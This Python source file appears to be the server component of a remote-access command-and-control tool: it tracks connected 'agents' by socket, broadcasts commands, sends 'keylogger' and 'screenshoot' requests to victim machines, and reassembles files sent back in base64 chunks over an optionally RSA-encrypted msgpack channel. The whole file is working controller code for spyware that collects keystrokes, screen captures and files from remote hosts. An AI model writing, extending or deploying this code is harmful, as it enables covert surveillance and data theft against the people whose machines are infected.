# Standard library imports
import base64
import msgpack
from datetime import datetime
from socket import socket
from typing import cast

# Third-party imports
from Crypto.Cipher import PKCS1_OAEP

# Local imports
from agent import Agent
from logger import get_logger
from globals import AGENTS_JSON, ENCODING, RECV_SIZE, TLS_ENABLED

logger = get_logger()


class AgentTool:
    """
    A class for agent utilities and management.
    
    This class handles all agent-related operations including:
    - Agent lifecycle management (add, remove, get)
    - Message sending and broadcasting
    - File transfer handling
    - Client connection management
    """

    def __init__(self, agents: list[Agent] = []) -> None:
        """Initialize AgentTool with optional list of agents."""
        self.agents = agents

    def add_agent(self, agent: Agent) -> None:
        """Add agent to agents list."""
        self.agents.append(agent)

    def del_agent(self, agent: Agent) -> None:
        """Remove agent from agents list."""
        self.agents.remove(agent)

    def get_agents(self) -> list[Agent]:
        """Return list of agent objects."""
        return self.agents

    def get_agent_by_rhost(self, rhost: str) -> Agent | None:
        """Get agent by remote address."""
        for agent in self.agents:
            if agent.addr == rhost:
                return agent
        return None

    def get_agent_by_index(self, index: int) -> Agent:
        """Return an agent with given index number."""
        return self.agents[index]

    def print_agents_table(self):
        """Print agents table with index and address."""
        for i, agent in enumerate(self.agents):
            print(f"{i} | {agent.addr}")

    def add_role_to_agent(self, role: str, agent: Agent) -> list[str]:
        """Add a role to an agent if not already present."""
        if role not in agent.roles:
            agent.roles.append(role)
        else:
            logger.info(f"{role} is already assigned to {agent.addr}")
        return agent.roles

    def broadcast_msg(self, data: bytes) -> None:
        """Send message to all agents."""
        for agent in self.agents:
            agent.socket.sendall(data)
            logger.debug(f"Broadcast message sent to {agent.addr}")

    def send_str(self, agent: Agent, msg: str) -> None:
        """Send string message to an agent."""
        socket = agent.socket
        socket.sendall(msg.encode())

    def send_str_by_rhost(self, rhost: str, msg: str) -> None:
        """Send string message to an agent by remote address."""
        agent = self.get_agent_by_rhost(rhost)
        if agent is None:
            logger.info(f"No agents found with remote address {rhost}")
            return
        else:
            self.send_str(agent, msg)

    def send_bytes(self, agent: Agent, data: bytes) -> None:
        """Send bytes to an agent."""
        socket = agent.socket
        socket.sendall(data)

    def generate_msgpack_from_dict(self, dictionary: dict) -> bytes:
        """Convert dictionary to msgpack bytes."""
        return cast(bytes, msgpack.dumps(dictionary))

    def request_screenshoot(self, agent: Agent) -> None:
        """Request screenshot from a client."""
        request = {"type": "screenshoot"}
        msg = self.generate_msgpack_from_dict(request)
        self.send_bytes(agent=agent, data=msg)

    def request_keystrokes(self, agent: Agent) -> None:
        """Request keystrokes from a client."""
        request = {"type": "keylogger"}
        msg = self.generate_msgpack_from_dict(request)
        self.send_bytes(agent, msg)

    def handle_screenshoot(self, data: bytes) -> str:
        """Save screenshot data to file and return filename."""
        filename = str(datetime.now().timestamp()) + ".jpg"
        with open(filename, "wb") as f:
            f.write(data)
        return filename

    def save_transferred_file(self, file_transfer_state: dict, addr: tuple) -> bool:
        """Reconstruct and save the transferred file from chunks."""
        try:
            filename = f"{addr[0]}_{file_transfer_state['filename']}"
            
            # Reconstruct file data from chunks
            full_data = bytearray()
            for i in range(file_transfer_state['total_chunks']):
                if i in file_transfer_state['chunks_data']:
                    chunk_base64 = file_transfer_state['chunks_data'][i]
                    chunk_bytes = base64.b64decode(chunk_base64)
                    full_data.extend(chunk_bytes)
                else:
                    logger.error(f"Missing chunk {i} for file {filename}")
                    return False
            
            # Save to file
            with open(filename, 'wb') as f:
                f.write(full_data)
            
            logger.info(f"File saved: {filename} ({len(full_data)} bytes)")
            return True
            
        except Exception as e:
            logger.error(f"Error saving file: {e}")
            return False

    def handle_client(
        self,
        client_socket: socket,
        addr: tuple,
        rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher | None,
        encoding: str = ENCODING,
        recv_size: int = RECV_SIZE,
        tls_enabled: bool | str = TLS_ENABLED,
        agents_json: str = AGENTS_JSON,
        logger=get_logger(),
    ) -> None:
        """
        Handle client connection and message processing.
        
        This method manages the entire lifecycle of a client connection including:
        - Agent registration
        - Message reception and parsing
        - File transfer handling
        - Connection cleanup
        """
        logger.info(f"\nConnection from {addr}")
        agent = Agent(str(addr), ["agent"], agents_json, socket=client_socket)

        # Add agent to the agents list
        self.add_agent(agent)

        # File transfer state tracking
        file_transfer_state = {
            'active': False,
            'filename': '',
            'total_size': 0,
            'total_chunks': 0,
            'received_chunks': 0,
            'chunks_data': {}
        }

        unpacker = msgpack.Unpacker(raw = False)

        try:
            while True:
                ###message: str = "None"
                data = client_socket.recv(recv_size)
                if not data:
                    break

                logger.debug(f"DATA SIZE = {len(data)}")
                
                try:
                    # Handle encrypted messages
                    if tls_enabled and tls_enabled != "False" and rsa_chipher is not None:
                        ###message = self._handle_encrypted_message(data, rsa_chipher)

                        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR

                        decrypted_data = rsa_chipher.decrypt(base64.b64decode(data))
                        unpacker.feed(decrypted_data)
                    else:
                        # Handle unencrypted messages
                        ###message = self._handle_unencrypted_message(data)

                        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR

                        unpacker.feed(data)

                    # UNPACKER ILE DUZENLENDI
                    for deserialized_data in unpacker:
                        message_dict = deserialized_data[0]
                        message = message_dict.get("content", "")
                    
                    # Process file transfer messages
                        if self._is_file_transfer_message(message):
                            self._handle_file_transfer_message(message, file_transfer_state, addr)
                            continue
                    
                        logger.info(f"Received from {addr}: {message}\n")
                    
                except Exception as msgpack_error:
                    logger.error(f"Msgpack deserialization error: {msgpack_error}")
                    self._handle_raw_message(data, addr)
                        
        except Exception as e:
            logger.error(f"Error with client {addr}: {e}")
        finally:
            # Cleanup connection
            self._cleanup_connection(agent, client_socket, addr)

    def _handle_encrypted_message(self, data: bytes, rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher) -> str:
        """Handle encrypted message decryption and parsing."""
        try:
            ###decrypted = rsa_chipher.decrypt(base64.b64decode(data))
            ###logger.debug(f"decrypted={decrypted}")
            ###deserialized_data: list = cast(list, msgpack.loads(decrypted))
            ###logger.debug(f"deserialized_data={deserialized_data}")
            ###message_dict: dict = deserialized_data[0]
            ###return message_dict["content"]

            # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR
            decrypted_data = rsa_chipher.decrypt(base64.b64decode(data))
            return msgpack.loads(decrypted_data)
        except Exception as e:
            logger.error(f"RSA decrypt error: {e}")
            raise

    def _handle_unencrypted_message(self, data: bytes) -> str:
        """Handle unencrypted message parsing."""
        ###deserialized_data: list = cast(list, msgpack.loads(data))
        ###message_dict: dict = deserialized_data[0]
        ###return message_dict["content"]

        # UNPACKER KULLANARAK TEKRAR YAZILDI USTTEKI KODLAR SILINEBILIR
        return msgpack.loads(data)

    def _is_file_transfer_message(self, message: str) -> bool:
        """Check if message is related to file transfer."""
        return message.startswith(("FILE_START:", "FILE_CHUNK:", "FILE_END:"))

    def _handle_file_transfer_message(self, message: str, file_transfer_state: dict, addr: tuple) -> None:
        """Handle different types of file transfer messages."""
        if message.startswith("FILE_START:"):
            self._handle_file_start(message, file_transfer_state)
        elif message.startswith("FILE_CHUNK:"):
            self._handle_file_chunk(message, file_transfer_state)
        elif message.startswith("FILE_END:"):
            self._handle_file_end(file_transfer_state, addr)

    def _handle_file_start(self, message: str, file_transfer_state: dict) -> None:
        """Handle file transfer start message."""
        parts = message.split(":", 3)
        if len(parts) == 4:
            filename = parts[1]
            total_size = int(parts[2])
            total_chunks = int(parts[3])
            file_transfer_state.update({
                'active': True,
                'filename': filename,
                'total_size': total_size,
                'total_chunks': total_chunks,
                'received_chunks': 0,
                'chunks_data': {}
            })
            logger.info(f"File transfer started: {filename} ({total_size} bytes, {total_chunks} chunks)")

    def _handle_file_chunk(self, message: str, file_transfer_state: dict) -> None:
        """Handle file chunk message."""
        if file_transfer_state['active']:
            parts = message.split(":", 2)
            if len(parts) == 3:
                chunk_num = int(parts[1])
                chunk_data = parts[2]
                file_transfer_state['chunks_data'][chunk_num] = chunk_data
                file_transfer_state['received_chunks'] += 1
                
                # Progress logging every 50 chunks
                if file_transfer_state['received_chunks'] % 50 == 0:
                    logger.info(f"Received chunk {file_transfer_state['received_chunks']}/{file_transfer_state['total_chunks']}")

    def _handle_file_end(self, file_transfer_state: dict, addr: tuple) -> None:
        """Handle file transfer end message."""
        if file_transfer_state['active']:
            self.save_transferred_file(file_transfer_state, addr)
            file_transfer_state['active'] = False

    def _handle_raw_message(self, data: bytes, addr: tuple) -> None:
        """Handle raw text message when msgpack parsing fails."""
        try:
            raw_message = data.decode(ENCODING)
            logger.info(f"Raw message from {addr}: {raw_message}")
        except:
            logger.error(f"Could not decode message from {addr}")

    def _cleanup_connection(self, agent: Agent, client_socket: socket, addr: tuple) -> None:
        """Clean up connection resources."""
        self.del_agent(agent)
        client_socket.close()
        logger.info(f"Connection with {addr} closed")
